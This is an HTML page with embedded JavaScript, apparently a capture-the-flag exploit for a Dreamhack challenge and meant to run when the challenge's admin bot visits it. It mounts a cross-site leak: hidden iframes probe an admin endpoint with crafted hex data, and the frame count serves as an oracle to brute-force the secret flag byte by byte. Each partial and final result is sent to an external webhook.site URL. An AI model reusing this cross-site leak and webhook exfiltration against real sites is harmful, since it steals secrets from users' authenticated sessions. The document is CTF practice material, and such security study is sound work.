<!DOCTYPE html>
<html>
<body>
<h3>플래그 추출 중... (봇이 방문해야 동작합니다)</h3>
<pre id="log">대기중...</pre>
<script>
const CHALL = "https://host3.dreamhack.games:17338";
const WEBHOOK = "https://webhook.site/11d97cdb-913a-46c0-9ee3-4ab71447d7f5";  // 결과 받는 곳

const logEl = document.getElementById('log');
function log(...args) {
  const msg = args.join(' ');
  console.log(msg);
  logEl.textContent += msg + '\n';
  // 중간 결과도 웹훅으로 전송
  new Image().src = WEBHOOK + '?log=' + encodeURIComponent(msg);
}

function makeData(pos, byte) {
  const buf = new Uint8Array(21);
  buf[16] = pos & 0xff;
  buf[17] = (pos >> 8) & 0xff;
  buf[18] = (pos >> 16) & 0xff;
  buf[19] = (pos >> 24) & 0xff;
  buf[20] = byte;
  return [...buf].map(b => b.toString(16).padStart(2, '0')).join('');
}

async function check(pos, byte) {
  const ifr = document.createElement('iframe');
  ifr.style.display = 'none';
  document.body.appendChild(ifr);
  ifr.src = CHALL + '/admin/probe?data=' + makeData(pos, byte);
  await new Promise(r => setTimeout(r, 1800));
  let len = 0;
  try { len = ifr.contentWindow.length; } catch(e) {}
  ifr.remove();
  return len > 0;
}

async function main() {
  let flag = '';
  log('시작...');

  for (let pos = 0; pos < 80; pos++) {
    let found = false;

    // 출력 가능한 문자 우선
    for (let b = 32; b <= 126; b++) {
      if (await check(pos, b)) {
        flag += String.fromCharCode(b);
        log(`pos ${pos}: '${String.fromCharCode(b)}' → ${flag}`);
        found = true;
        break;
      }
    }

    if (!found) {
      for (let b = 0; b < 256; b++) {
        if (b >= 32 && b <= 126) continue;
        if (await check(pos, b)) {
          flag += String.fromCharCode(b);
          log(`pos ${pos}: 0x${b.toString(16)} → ${flag}`);
          found = true;
          break;
        }
      }
    }

    if (!found) {
      flag += '?';
      log(`pos ${pos}: 실패 → ${flag}`);
    }

    // 매 글자마다 웹훅으로 전송
    new Image().src = WEBHOOK + '?pos=' + pos + '&flag=' + encodeURIComponent(flag);

    if (flag.endsWith('}')) break;
  }

  log('최종 플래그: ' + flag);
  new Image().src = WEBHOOK + '?done=1&flag=' + encodeURIComponent(flag);
  document.body.innerHTML = '<h2>FLAG: ' + flag + '</h2>';
}

main().catch(e => log('에러: ' + e));
</script>
</body>
</html>